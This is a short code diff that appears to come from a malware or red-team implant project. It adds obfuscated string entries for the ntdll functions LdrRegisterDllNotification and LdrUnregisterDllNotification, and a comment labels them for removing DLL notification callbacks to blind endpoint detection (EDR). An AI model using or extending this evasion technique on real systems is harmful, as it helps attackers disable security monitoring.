@@ -59,6 +59,9 @@ OBFUSCATED_STRINGS = {
     "XSTR_DLL_WILDCARD":            "*.dll",
     # Crypt.c (decompression via ntdll)
     "XSTR_RTL_DECOMPRESS_BUFFER":   "RtlDecompressBuffer",
+    # Evasion.c (DLL notification callback removal — EDR blinding)
+    "XSTR_LDR_REG_DLL_NOTIF":      "LdrRegisterDllNotification",
+    "XSTR_LDR_UNREG_DLL_NOTIF":    "LdrUnregisterDllNotification",
 }
 
 
